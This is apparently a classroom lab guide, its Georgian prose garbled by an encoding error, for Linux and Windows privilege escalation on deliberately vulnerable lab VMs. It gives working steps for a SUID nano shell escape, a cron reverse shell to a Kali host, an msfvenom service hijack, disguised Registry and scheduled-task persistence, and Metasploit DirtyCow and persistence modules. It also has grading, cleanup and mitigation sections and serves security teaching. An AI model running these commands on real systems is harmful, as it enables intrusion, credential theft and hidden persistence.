# ğŸ§ª Privilege Escalation - áƒ“áƒ”áƒ¢áƒáƒšáƒ£áƒ áƒ˜ áƒšáƒáƒ‘áƒáƒ áƒáƒ¢áƒáƒ áƒ˜áƒ

## ğŸ¯ áƒšáƒáƒ‘áƒ˜áƒ¡ áƒ›áƒ˜áƒ–áƒœáƒ”áƒ‘áƒ˜
- Linux SUID exploit-áƒ˜áƒ— root áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ
- Windows Service Permissions exploit
- Persistence áƒ›áƒ”áƒ¥áƒáƒœáƒ˜áƒ–áƒ›áƒ”áƒ‘áƒ˜áƒ¡ áƒ“áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ
- áƒœáƒáƒ‘áƒ˜áƒ¯-áƒœáƒáƒ‘áƒ˜áƒ¯ áƒáƒ áƒáƒ¥áƒ¢áƒ˜áƒ™áƒ£áƒšáƒ˜ áƒ•áƒáƒ áƒ¯áƒ˜áƒ¨áƒ˜

---

## ğŸ”§ áƒ¡áƒáƒ­áƒ˜áƒ áƒ áƒ áƒ”áƒ¡áƒ£áƒ áƒ¡áƒ”áƒ‘áƒ˜

### ğŸ’» Virtual Machines:
- **Kali Linux** (Attacker) - VirtualBox/VMware
- **Ubuntu 18.04** (Linux Target) 
- **Windows 10** (Windows Target)
- **áƒ§áƒ•áƒ”áƒšáƒ VM áƒ”áƒ áƒ— Network-áƒ¨áƒ˜** (NAT áƒáƒœ Host-Only)

### ğŸ“¦ áƒ“áƒáƒ›áƒáƒ¢áƒ”áƒ‘áƒ˜áƒ—áƒ˜ Tools:
- **linpeas.sh** - Linux enumeration
- **winPEAS.exe** - Windows enumeration
- **netcat** - reverse shells
- **Metasploit** - exploitation framework

---

## ğŸ§ áƒšáƒáƒ‘áƒ˜ #1: Linux SUID Privilege Escalation

### ğŸ¬ áƒ¡áƒªáƒ”áƒœáƒáƒ áƒ˜:
áƒ¨áƒ”áƒœ áƒ¨áƒ”áƒ¦áƒ¬áƒ”áƒ£áƒšáƒ˜ áƒ®áƒáƒ  Ubuntu áƒ¡áƒ”áƒ áƒ•áƒ”áƒ áƒ–áƒ” `john` áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ— SSH-áƒ˜áƒ—. áƒ›áƒ˜áƒ–áƒáƒœáƒ˜áƒ `root` áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜áƒ¡ áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ.

---

### ğŸ“‹ **STEP 1: áƒ’áƒáƒ áƒ”áƒ›áƒáƒ¡ áƒ›áƒáƒ›áƒ–áƒáƒ“áƒ”áƒ‘áƒ**

#### ğŸ”§ Ubuntu VM Setup (Instructor):
```bash
# Ubuntu VM-áƒ–áƒ” SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ
sudo cp /bin/nano /tmp/vulnerable_nano
sudo chmod 4755 /tmp/vulnerable_nano
sudo chown root:root /tmp/vulnerable_nano

# áƒ¢áƒ”áƒ¡áƒ¢ áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ¡ áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ
sudo useradd -m -s /bin/bash john
echo "john:password123" | sudo chpasswd
```

#### ğŸ’¡ **áƒ¡áƒ¢áƒ£áƒ“áƒ”áƒœáƒ¢áƒ˜áƒ¡áƒ—áƒ•áƒ˜áƒ¡ - áƒ’áƒáƒ£áƒ—áƒáƒ•áƒ˜áƒ¡áƒ£áƒ¤áƒšáƒ“áƒ˜ SSH-áƒ˜áƒ—:**
```bash
# Kali Linux-áƒ˜áƒ“áƒáƒœ
ssh john@UBUNTU_IP
# Password: password123
```

---

### ğŸ“‹ **STEP 2: áƒáƒ˜áƒ áƒ•áƒ”áƒšáƒáƒ“áƒ˜ áƒ“áƒáƒ–áƒ•áƒ”áƒ áƒ•áƒ**

#### ğŸ” **áƒ’áƒáƒ áƒ”áƒ›áƒáƒ¡ áƒ¨áƒ”áƒ¡áƒ¬áƒáƒ•áƒšáƒ:**
```bash
# áƒ•áƒ˜áƒœ áƒ•áƒáƒ  áƒ“áƒ áƒ¡áƒáƒ“ áƒ•áƒáƒ ?
whoami
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: john

id
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: uid=1001(john) gid=1001(john) groups=1001(john)

# áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ˜áƒ¡ áƒ˜áƒœáƒ¤áƒáƒ áƒ›áƒáƒªáƒ˜áƒ
uname -a
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: Linux ubuntu 4.15.0-54-generic #58-Ubuntu...

pwd
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: /home/john
```

#### ğŸ” **áƒáƒ áƒ˜áƒ•áƒ˜áƒšáƒ”áƒ’áƒ˜áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:**
```bash
# sudo áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜
sudo -l
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: Sorry, user john may not run sudo on ubuntu

# groups áƒ›áƒáƒœáƒáƒ¬áƒ˜áƒšáƒ”áƒáƒ‘áƒ
groups
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: john
```

ğŸ’¡ **áƒáƒ¦áƒ¬áƒ”áƒ áƒ:** áƒ¯áƒ”áƒ áƒ¯áƒ”áƒ áƒáƒ‘áƒ˜áƒ— áƒ©áƒ•áƒ”áƒ£áƒšáƒ”áƒ‘áƒ áƒ˜áƒ•áƒ˜ áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ¡ áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜ áƒ’áƒ•áƒáƒ¥áƒ•áƒ¡!

---

### ğŸ“‹ **STEP 3: SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒœáƒáƒ“áƒ˜áƒ áƒáƒ‘áƒ**

#### ğŸ¯ **SUID áƒ¤áƒáƒ˜áƒšáƒ”áƒ‘áƒ˜áƒ¡ áƒáƒáƒ•áƒœáƒ:**
```bash
# áƒ§áƒ•áƒ”áƒšáƒáƒ–áƒ” áƒ›áƒœáƒ˜áƒ¨áƒ•áƒœáƒ”áƒšáƒáƒ•áƒáƒœáƒ˜ áƒ‘áƒ áƒ«áƒáƒœáƒ”áƒ‘áƒ!
find / -perm -4000 -type f 2>/dev/null
```

**ğŸ“Š áƒ›áƒáƒ¡áƒáƒšáƒáƒ“áƒœáƒ”áƒšáƒ˜ áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜:**
```
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/bin/mount
/bin/umount
/bin/su
/tmp/vulnerable_nano    â† ğŸ¯ áƒ”áƒ¡ áƒáƒ áƒ˜áƒ¡ áƒ©áƒ•áƒ”áƒœáƒ˜ target!
```

#### ğŸ” **áƒáƒœáƒáƒšáƒ˜áƒ–áƒ˜:**
```bash
# áƒ“áƒáƒ•áƒáƒ›áƒáƒ¬áƒ›áƒáƒ— vulnerable_nano
ls -la /tmp/vulnerable_nano
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: -rwsr-xr-x 1 root root 240613 Dec 25 10:30 /tmp/vulnerable_nano

# s áƒ‘áƒ˜áƒ—áƒ˜ áƒœáƒ˜áƒ¨áƒœáƒáƒ•áƒ¡ SUID!
# root áƒ”áƒ™áƒ£áƒ—áƒ•áƒœáƒ˜áƒ¡ áƒ“áƒ SUID-áƒ˜áƒ = áƒ¡áƒáƒ¨áƒ˜áƒ¨áƒ˜áƒ! ğŸš¨
```

---

### ğŸ“‹ **STEP 4: GTFOBins-áƒ˜áƒ¡ áƒ™áƒáƒœáƒ¡áƒ£áƒšáƒ¢áƒáƒªáƒ˜áƒ**

#### ğŸŒ **https://gtfobins.github.io/gtfobins/nano/ áƒ•áƒ˜áƒ–áƒ˜áƒ¢áƒ˜**

**ğŸ“– áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ£áƒšáƒ˜ áƒ˜áƒœáƒ¤áƒáƒ áƒ›áƒáƒªáƒ˜áƒ:**
```bash
# nano SUID exploit:
./nano -T4 /etc/passwd
# áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’ nano-áƒ¨áƒ˜:
# Ctrl+R (Read File)
# Ctrl+X (Execute Command)
# áƒ©áƒáƒ¬áƒ”áƒ áƒ”: reset; sh 1>&0 2>&0
```

---

### ğŸ“‹ **STEP 5: Exploitation**

#### ğŸš€ **SUID nano Exploit:**
```bash
# vulnerable nano-áƒ¡ áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ
/tmp/vulnerable_nano -T4 /etc/passwd
```

#### ğŸ® **nano Editor-áƒ¨áƒ˜:**
1. **Ctrl+R** (Read File áƒ¦áƒ˜áƒšáƒáƒ™áƒ˜)
2. **Ctrl+X** (Execute Command áƒ¦áƒ˜áƒšáƒáƒ™áƒ˜) 
3. **áƒ©áƒáƒ¬áƒ”áƒ áƒ”:** `reset; sh 1>&0 2>&0`
4. **Enter** áƒ“áƒáƒ­áƒ˜áƒ áƒ”

#### ğŸ‰ **áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:**
```bash
# áƒ—áƒ£ áƒ§áƒ•áƒ”áƒšáƒáƒ¤áƒ”áƒ áƒ˜ áƒ¡áƒ¬áƒáƒ áƒ˜áƒ, áƒ›áƒ˜áƒ˜áƒ¦áƒ”áƒ‘:
# 

whoami
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: root ğŸ¯

id
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: uid=0(root) gid=0(root) groups=0(root)
```

#### ğŸ“¸ **Screenshot-áƒ˜áƒ¡ áƒ’áƒáƒ“áƒáƒ¦áƒ”áƒ‘áƒ:**
```bash
# áƒ›áƒ¢áƒ™áƒ˜áƒªáƒ”áƒ‘áƒ£áƒšáƒ”áƒ‘áƒ˜áƒ¡ áƒ’áƒáƒ“áƒáƒ¦áƒ”áƒ‘áƒ
cat /etc/shadow
# áƒ›áƒ®áƒáƒšáƒáƒ“ root-áƒ¡ áƒ¨áƒ”áƒ£áƒ«áƒšáƒ˜áƒ áƒ¬áƒáƒ™áƒ˜áƒ—áƒ®áƒ•áƒ!
```

---

### ğŸ“‹ **STEP 6: Linux Persistence**

#### ğŸ•’ **Cron Job Backdoor-áƒ˜áƒ¡ áƒ“áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ:**

```bash
# áƒ¨áƒ”áƒœáƒ˜ Kali IP-áƒ˜áƒ¡ áƒ’áƒáƒ’áƒ”áƒ‘áƒ
# Kali VM-áƒ–áƒ” áƒ¡áƒ®áƒ•áƒ terminal-áƒ¨áƒ˜:
ip addr show
# áƒ›áƒáƒ’: 192.168.56.101
```

```bash
# Ubuntu root shell-áƒ˜áƒ“áƒáƒœ:
echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" > /tmp/cron_job

# crontab-áƒ¨áƒ˜ áƒ“áƒáƒ›áƒáƒ¢áƒ”áƒ‘áƒ
crontab /tmp/cron_job

# áƒ“áƒáƒ•áƒáƒ“áƒáƒ¡áƒ¢áƒ£áƒ áƒáƒ—
crontab -l
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: */5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
```

#### ğŸ§ **Listener-áƒ˜áƒ¡ áƒ›áƒáƒ›áƒ–áƒáƒ“áƒ”áƒ‘áƒ:**
```bash
# Kali Linux-áƒ–áƒ” áƒáƒ®áƒáƒš terminal-áƒ¨áƒ˜:
nc -lvnp 4444
# áƒ“áƒ áƒ•áƒ”áƒšáƒáƒ“áƒ”áƒ‘áƒ˜ 5 áƒ¬áƒ£áƒ—áƒ¡...
```

#### â° **5 áƒ¬áƒ£áƒ—áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’:**
```bash
# nc terminal-áƒ¨áƒ˜ áƒ£áƒœáƒ“áƒ áƒ“áƒáƒ’áƒ”áƒœáƒáƒ®áƒáƒ¡:
Connection received on 192.168.56.102 54321
root@ubuntu:~# whoami
root
```

---

## ğŸ¢ áƒšáƒáƒ‘áƒ˜ #2: Windows Service Privilege Escalation  

### ğŸ¬ áƒ¡áƒªáƒ”áƒœáƒáƒ áƒ˜:
áƒ¨áƒ”áƒœ áƒ¨áƒ”áƒ¦áƒ¬áƒ”áƒ£áƒšáƒ˜ áƒ®áƒáƒ  Windows 10 áƒ›áƒáƒœáƒ¥áƒáƒœáƒáƒ–áƒ” `bob` áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ—. áƒ›áƒ˜áƒ–áƒáƒœáƒ˜áƒ `SYSTEM` áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜áƒ¡ áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ.

---

### ğŸ“‹ **STEP 1: Windows VM Setup (Instructor)**

#### ğŸ”§ **Vulnerable Service áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ:**
```cmd
# Administrator CMD-áƒ¨áƒ˜:
sc create VulnService binpath= "C:\Windows\System32\svchost.exe" start= auto
sc sidtype VulnService unrestricted

# Service permissions-áƒ˜áƒ¡ áƒ¨áƒ”áƒªáƒ•áƒšáƒ
sc sdset VulnService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

#### ğŸ‘¤ **áƒ¢áƒ”áƒ¡áƒ¢ áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒ”áƒšáƒ˜:**
```cmd
net user bob password123 /add
net localgroup "Users" bob /add
```

---

### ğŸ“‹ **STEP 2: Initial Access**

#### ğŸ” **RDP áƒ™áƒáƒ•áƒ¨áƒ˜áƒ áƒ˜:**
```bash
# Kali Linux-áƒ˜áƒ“áƒáƒœ
rdesktop -u bob -p password123 WINDOWS_IP
# áƒáƒœ
xfreerdp /u:bob /p:password123 /v:WINDOWS_IP
```

---

### ğŸ“‹ **STEP 3: Windows Enumeration**

#### ğŸ” **áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ˜áƒ¡ áƒ˜áƒœáƒ¤áƒáƒ áƒ›áƒáƒªáƒ˜áƒ:**
```cmd
# áƒ•áƒ˜áƒœ áƒ•áƒáƒ áƒ—?
whoami
REM áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: desktop-abc123\bob

# áƒáƒ áƒ˜áƒ•áƒ˜áƒšáƒ”áƒ’áƒ˜áƒ”áƒ‘áƒ˜
whoami /priv

# áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ˜áƒ¡ áƒ•áƒ”áƒ áƒ¡áƒ˜áƒ
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### ğŸ“‚ **winPEAS.exe áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ:**
```cmd
# winPEAS-áƒ˜áƒ¡ áƒ©áƒáƒ›áƒáƒ¢áƒ•áƒ˜áƒ áƒ—áƒ•áƒ (Instructor áƒ£áƒ–áƒ áƒ£áƒœáƒ•áƒ”áƒšáƒ§áƒáƒ¤áƒ¡)
C:\Tools\winPEAS.exe servicesinfo
```

#### ğŸ¯ **áƒ®áƒ”áƒšáƒ˜áƒ— Services-áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:**
```cmd
# Services permissions áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ
icacls "C:\Program Files"

# Services áƒ¡áƒ˜áƒ
sc query state= all

# Service áƒ™áƒáƒœáƒ¤áƒ˜áƒ’áƒ£áƒ áƒáƒªáƒ˜áƒ
sc qc VulnService
```

---

### ğŸ“‹ **STEP 4: Service Exploitation**

#### ğŸ› ï¸ **Malicious Executable áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ:**
```bash
# Kali Linux-áƒ–áƒ”
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f exe > evil.exe

# Windows VM-áƒ–áƒ” áƒáƒ¢áƒ•áƒ˜áƒ áƒ—áƒ•áƒ
python3 -m http.server 8080
# Windows-áƒ–áƒ”: http://KALI_IP:8080/evil.exe
```

#### ğŸ§ **Listener áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ:**
```bash
# Kali Linux-áƒ–áƒ”
nc -lvnp 4445
```

#### âš™ï¸ **Service-áƒ˜áƒ¡ áƒ¨áƒ”áƒªáƒ•áƒšáƒ:**
```cmd
# Windows VM-áƒ–áƒ”
sc config VulnService binpath= "C:\Tools\evil.exe"

# Service-áƒ˜áƒ¡ áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ
sc start VulnService
```

#### ğŸ‰ **SYSTEM Shell áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ:**
```bash
# nc listener-áƒ–áƒ”:
Connection received on WINDOWS_IP 49157
Microsoft Windows [Version 10.0.18363.1316]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system  ğŸ¯
```

---

### ğŸ“‹ **STEP 5: Windows Persistence**

#### ğŸ“ **Registry Run Key:**
```cmd
# SYSTEM shell-áƒ˜áƒ“áƒáƒœ
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Tools\evil.exe" /f

# áƒ“áƒáƒ•áƒáƒ“áƒáƒ¡áƒ¢áƒ£áƒ áƒáƒ—
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### â° **Scheduled Task:**
```cmd
# áƒ§áƒáƒ•áƒ”áƒš 10 áƒ¬áƒ£áƒ—áƒ¨áƒ˜ reverse shell
schtasks /create /tn "SystemUpdate" /tr "C:\Tools\evil.exe" /sc minute /mo 10 /ru SYSTEM
```

---

## ğŸ§ª áƒšáƒáƒ‘áƒ˜ #3: Metasploit Automation

### ğŸ“‹ **STEP 1: Linux Kernel Exploit**

#### ğŸ” **Target Discovery:**
```bash
# Kali Linux-áƒ–áƒ”
nmap -sS -sV UBUNTU_IP

# SSH-áƒ˜áƒ— áƒ™áƒáƒ•áƒ¨áƒ˜áƒ áƒ˜ john áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ—
ssh john@UBUNTU_IP
```

#### ğŸ“Š **Kernel Version áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:**
```bash
uname -r
# áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ˜: 4.15.0-54-generic (DirtyCow vulnerable)
```

#### ğŸš€ **Metasploit Exploit:**
```bash
# Kali Linux-áƒ–áƒ”
msfconsole

# Metasploit-áƒ¨áƒ˜:
use exploit/linux/local/cve_2016_5195_dirtycow
set SESSION 1  # SSH session number
set LHOST KALI_IP
set LPORT 4446
exploit
```

---

### ğŸ“‹ **STEP 2: Persistence Module**

#### ğŸ”„ **Metasploit Persistence:**
```bash
# Metasploit-áƒ¨áƒ˜ (Linux root session-áƒ¨áƒ˜)
use post/linux/manage/sshkey_persistence
set SESSION 2  # root session
run

# Windows SYSTEM session-áƒ¨áƒ˜
use post/windows/manage/persistence_exe
set SESSION 3  # Windows SYSTEM session
set REXEPATH C:\Tools\persistent.exe
run
```

---

## ğŸ“Š áƒšáƒáƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ“áƒ”áƒ’áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ¯áƒáƒ›áƒ”áƒ‘áƒ

### âœ… **Linux áƒœáƒáƒ¬áƒ˜áƒšáƒ˜ (20 áƒ¥áƒ£áƒšáƒ):**
- [ ] **SSH áƒ¬áƒ•áƒ“áƒáƒ›áƒ** john áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ— (2 áƒ¥áƒ£áƒšáƒ)
- [ ] **SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒáƒáƒ•áƒœáƒ** `/tmp/vulnerable_nano` (3 áƒ¥áƒ£áƒšáƒ)
- [ ] **GTFOBins-áƒ˜áƒ¡ áƒ’áƒáƒ›áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ** (3 áƒ¥áƒ£áƒšáƒ)
- [ ] **Root shell áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ** `whoami` screenshot (5 áƒ¥áƒ£áƒšáƒ)
- [ ] **Cron persistence** áƒ›áƒ£áƒ¨áƒ reverse shell (4 áƒ¥áƒ£áƒšáƒ)
- [ ] **Listener-áƒ–áƒ” connection** áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ (3 áƒ¥áƒ£áƒšáƒ)

### âœ… **Windows áƒœáƒáƒ¬áƒ˜áƒšáƒ˜ (20 áƒ¥áƒ£áƒšáƒ):**
- [ ] **RDP áƒ¬áƒ•áƒ“áƒáƒ›áƒ** bob áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ— (2 áƒ¥áƒ£áƒšáƒ)
- [ ] **winPEAS enumeration** áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ (3 áƒ¥áƒ£áƒšáƒ)
- [ ] **Service vulnerability** áƒáƒ¦áƒ›áƒáƒ©áƒ”áƒœáƒ (3 áƒ¥áƒ£áƒšáƒ)
- [ ] **Malicious service** áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ (4 áƒ¥áƒ£áƒšáƒ)
- [ ] **SYSTEM shell** áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ (5 áƒ¥áƒ£áƒšáƒ)
- [ ] **Registry persistence** (3 áƒ¥áƒ£áƒšáƒ)

### âœ… **Metasploit áƒœáƒáƒ¬áƒ˜áƒšáƒ˜ (10 áƒ¥áƒ£áƒšáƒ):**
- [ ] **Kernel exploit** áƒ’áƒáƒ›áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ (5 áƒ¥áƒ£áƒšáƒ)
- [ ] **Persistence module** áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ (5 áƒ¥áƒ£áƒšáƒ)

---

## ğŸš¨ áƒ’áƒáƒ¤áƒ áƒ—áƒ®áƒ˜áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜ áƒ“áƒ áƒ áƒ©áƒ”áƒ•áƒ”áƒ‘áƒ˜

### âš ï¸ **áƒ®áƒ¨áƒ˜áƒ áƒ˜ áƒ¨áƒ”áƒªáƒ“áƒáƒ›áƒ”áƒ‘áƒ˜:**

#### ğŸ§ **Linux:**
- **áƒáƒ áƒáƒ¡áƒ¬áƒáƒ áƒ˜ IP cron job-áƒ¨áƒ˜** - áƒ§áƒáƒ•áƒ”áƒšáƒ—áƒ•áƒ˜áƒ¡ `ip addr show`
- **nc listener áƒáƒ  áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡** - firewall/port forwarding
- **SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ˜ áƒáƒ  áƒ”áƒ¨áƒ•áƒ”áƒ‘áƒ** - permissions/path áƒáƒ áƒáƒ‘áƒšáƒ”áƒ›áƒ

#### ğŸ¢ **Windows:**
- **RDP connection áƒáƒ  áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡** - RDP service áƒ’áƒáƒ›áƒáƒ áƒ—áƒ£áƒšáƒ˜
- **Service exploit áƒ•áƒ”áƒ  áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡** - UAC/Windows Defender
- **Payload áƒáƒ  áƒ”áƒ¨áƒ•áƒ”áƒ‘áƒ** - Antivirus áƒ‘áƒšáƒáƒ™áƒáƒ•áƒ¡

### ğŸ’¡ **Tips & Tricks:**

#### ğŸ”§ **Debug áƒ‘áƒ áƒ«áƒáƒœáƒ”áƒ‘áƒ”áƒ‘áƒ˜:**
```bash
# Linux
systemctl status cron  # cron service áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡?
tail -f /var/log/cron   # cron áƒšáƒáƒ’áƒ”áƒ‘áƒ˜

# Windows  
sc query VulnService    # service status
eventvwr.msc           # Windows Event Logs
```

#### ğŸ›¡ï¸ **Cleanup:**
```bash
# Linux
crontab -r              # persistence áƒ¬áƒáƒ¨áƒšáƒ

# Windows
sc delete VulnService   # service áƒ¬áƒáƒ¨áƒšáƒ
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

---

## ğŸ“ áƒ¨áƒ”áƒ¯áƒáƒ›áƒ”áƒ‘áƒ áƒ“áƒ áƒ áƒ”áƒáƒáƒ áƒ¢áƒ˜

### ğŸ“‹ **áƒ¡áƒ¢áƒ£áƒ“áƒ”áƒœáƒ¢áƒ›áƒ áƒ£áƒœáƒ“áƒ áƒ©áƒáƒáƒ‘áƒáƒ áƒáƒ¡:**

1. **ğŸ“¸ Screenshots** áƒ§áƒ•áƒ”áƒšáƒ áƒ›áƒœáƒ˜áƒ¨áƒ•áƒœáƒ”áƒšáƒáƒ•áƒáƒœáƒ˜ áƒœáƒáƒ‘áƒ˜áƒ¯áƒ˜áƒ¡áƒ—áƒ•áƒ˜áƒ¡
2. **ğŸ“ Command History** (`history` áƒ‘áƒ áƒ«áƒáƒœáƒ”áƒ‘áƒ)
3. **ğŸ” Vulnerability Assessment** - áƒ áƒ áƒ˜áƒáƒáƒ•áƒ áƒ“áƒ áƒ áƒáƒ’áƒáƒ 
4. **ğŸ›¡ï¸ Mitigation Steps** - áƒ áƒáƒ’áƒáƒ  áƒ£áƒœáƒ“áƒ áƒáƒ›áƒáƒ¦áƒ”áƒ‘áƒ£áƒšáƒ˜áƒ§áƒ áƒ“áƒáƒ£áƒªáƒ•áƒ”áƒšáƒáƒ‘áƒ
5. **ğŸ“Š Summary Report** - áƒ áƒáƒ¡ áƒ˜áƒ¡áƒ¬áƒáƒ•áƒšáƒ

### ğŸ¯ **áƒ¡áƒáƒ‘áƒáƒšáƒáƒ áƒ›áƒ˜áƒ–áƒáƒœáƒ˜:**
áƒ¡áƒ¢áƒ£áƒ“áƒ”áƒœáƒ¢áƒ›áƒ áƒ£áƒœáƒ“áƒ áƒœáƒáƒ—áƒšáƒáƒ“ áƒ’áƒáƒ˜áƒ’áƒáƒ¡ Privilege Escalation-áƒ˜áƒ¡ áƒáƒ áƒáƒªáƒ”áƒ¡áƒ˜ áƒ“áƒ áƒ¨áƒ”áƒ«áƒšáƒáƒ¡ áƒ›áƒ˜áƒ¡áƒ˜ áƒ’áƒáƒ›áƒ”áƒáƒ áƒ”áƒ‘áƒ áƒ áƒ”áƒáƒšáƒ£áƒ  áƒ’áƒáƒ áƒ”áƒ›áƒáƒ¨áƒ˜!
